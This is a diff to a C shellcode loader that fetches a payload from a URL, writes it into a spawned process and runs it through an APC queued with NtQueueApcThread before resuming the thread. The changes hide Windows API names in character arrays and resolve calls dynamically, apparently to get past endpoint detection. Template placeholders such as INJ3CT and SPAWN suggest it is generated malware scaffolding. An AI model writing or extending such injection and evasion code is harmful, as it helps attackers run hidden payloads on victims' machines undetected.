@@ -25,6 +25,19 @@
 
 NTSTATUS status;
 
+typedef NTSTATUS (NTAPI *PNTQUEUEAPCTHREAD)(
+    HANDLE ThreadHandle,
+    PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcRoutineContext,
+    PIO_STATUS_BLOCK ApcStatusBlock,
+    ULONG ApcReserved
+    );
+
+typedef VOID (NTAPI *PIO_APC_ROUTINE)(
+    PVOID ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    ULONG Reserved
+);
 typedef NTSTATUS(NTAPI *NtWriteVirtualMemoryPtr)(
     HANDLE ProcessHandle,
     PVOID BaseAddress,
@@ -33,8 +46,12 @@ typedef NTSTATUS(NTAPI *NtWriteVirtualMemoryPtr)(
     PSIZE_T NumberOfBytesWritten OPTIONAL
 );
 
-typedef VOID (NTAPI *PAPCFUNC)(
-    ULONG_PTR dwParam
+typedef BOOL (WINAPI *PWRITEPROCESSMEMORY)(
+    HANDLE hProcess,
+    LPVOID lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T nSize,
+    SIZE_T *lpNumberOfBytesWritten
 );
 
 
@@ -122,6 +139,11 @@ typedef BOOL(WINAPI* fnCloseHandle)(
     HANDLE hObject
 );
 
+typedef NTSTATUS (NTAPI *PFN_NTCLOSE)(
+    HANDLE Handle
+);
+
+
 unsigned char RandomG[] = KEYVALUE
 
 unsigned char RandomJ[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 0x0 };
@@ -129,8 +151,12 @@ unsigned char Random1[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c
 unsigned char Random2[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
 unsigned char Random3[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
 unsigned char Random4[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+unsigned char RandomL[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't', 0x0 };
+unsigned char RandomM[] = { 'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 0x0 };
+unsigned char RandomN[] = { 'N','t','C', 'l', 'o', 's', 'e', 0x0 };
 INJ3CT
 SPAWN
+
 
 
 typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);
@@ -156,16 +182,16 @@ FARPROC Random5(HMODULE hModule, LPCSTR lpProcName) {
 
 // Function to get the address of NT APIs from kernel32.dll
 fnCreateToolhelp32Snapshot NtCreateToolhelp32Snapshot_p =
-    (fnCreateToolhelp32Snapshot)Random5(GetModuleHandleA(Random4), "CreateToolhelp32Snapshot");
+    (fnCreateToolhelp32Snapshot)Random5(GetModuleHandleA(Random4), RandomL);
 
 fnProcess32First NtProcess32First_p =
-    (fnProcess32First)Random5(GetModuleHandleA(Random4), "Process32First");
+    (fnProcess32First)Random5(GetModuleHandleA(Random4), RandomM);
 
 fnProcess32Next NtProcess32Next_p =
     (fnProcess32Next)Random5(GetModuleHandleA(Random4), "Process32Next");
 
-fnCloseHandle NtClose_p =
-    (fnCloseHandle)Random5(GetModuleHandleA(Random4), "CloseHandle");
+PFN_NTCLOSE NtClose_p =
+    (PFN_NTCLOSE)Random5(GetModuleHandleA(Random3), RandomN);
 
 pfnNtProtectVirtualMemory NtProtectVirtualMemory_p = (pfnNtProtectVirtualMemory)Random5(GetModuleHandle(Random3), "NtProtectVirtualMemory");
 
@@ -315,7 +341,7 @@ int RandomA(const char* procname) {
 
     // Get information about the first process
     if (!NtProcess32First_p(hProcSnap, &pe32)) {
-        NtClose_p(hProcSnap);
+        CloseHandle(hProcSnap);
         return 0;
     }
 
@@ -444,12 +470,13 @@ static int RandomF(const HMODULE hNtdll, const LPVOID pCache) {
     return -1;
 }
 
-DWORD GetPidByName(const char * pName) {
+DWORD RandomO(const char * pName) {
 	PROCESSENTRY32 pEntry;
 	HANDLE snapshot;
 
 	pEntry.dwSize = sizeof(PROCESSENTRY32);
-	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    snapshot = NtCreateToolhelp32Snapshot_p(TH32CS_SNAPPROCESS, 0);
+
 
 	if (Process32First(snapshot, &pEntry) == TRUE) {
 		while (Process32Next(snapshot, &pEntry) == TRUE) {
@@ -458,7 +485,7 @@ DWORD GetPidByName(const char * pName) {
 			}
 		}
 	}
-	CloseHandle(snapshot);
+	NtClose_p(snapshot);
 	return 0;
 }
 
@@ -502,8 +529,7 @@ if (!Random7(szUrl, &Random8, &Random9)) {
 		return 1;
 	}	
 
-   
-	// get the size of ntdll module in memory
+  
 char * pNtdllAddr = (char *)GetModuleHandle(Random3);
 IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *)pNtdllAddr;
 IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *)(pNtdllAddr + pDosHdr->e_lfanew);
@@ -567,12 +593,55 @@ if (!successes) {
 
 	Random6(1000);
    
-    WriteProcessMemory(pi.hProcess, pRemoteCode, Random8, Random9, NULL);
+   PWRITEPROCESSMEMORY pWriteProcessMemory = (PWRITEPROCESSMEMORY)Random5(
+        GetModuleHandle(Random4),
+        "WriteProcessMemory"
+    );
+
+    if (pWriteProcessMemory != NULL) {
+        // Define your parameters
+        HANDLE hProcess = pi.hProcess;  
+        LPVOID lpBaseAddress = pRemoteCode;  
+        LPCVOID lpBuffer = Random8;  
+        SIZE_T nSize = Random9;  
+        SIZE_T lpNumberOfBytesWritten;
+
+
+        BOOL success = pWriteProcessMemory(
+            hProcess,
+            lpBaseAddress,
+            lpBuffer,
+            nSize,
+            &lpNumberOfBytesWritten
+        );
+
+
+        if (success) {
+
+        } else {
+
+        }
+    } else {
+
+    }
 
 	Random6(1000);
-	
-    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
-	
+PNTQUEUEAPCTHREAD NtQueueApcThread = (PNTQUEUEAPCTHREAD)Random5(
+    GetModuleHandle(Random3),
+    "NtQueueApcThread"
+);
+
+if (NtQueueApcThread != NULL) {
+    // Now call the function using the obtained function pointer
+    NTSTATUS status = NtQueueApcThread(
+        pi.hThread,     // Thread handle
+        (PIO_APC_ROUTINE)pRemoteCode,  // APC routine
+        NULL,           // APC routine context
+        NULL,           // Status block (optional)
+        0               // Reserved (should be zero)
+    );
+   }
+
     Random6(1000);
 
 	ResumeThread(pi.hThread);
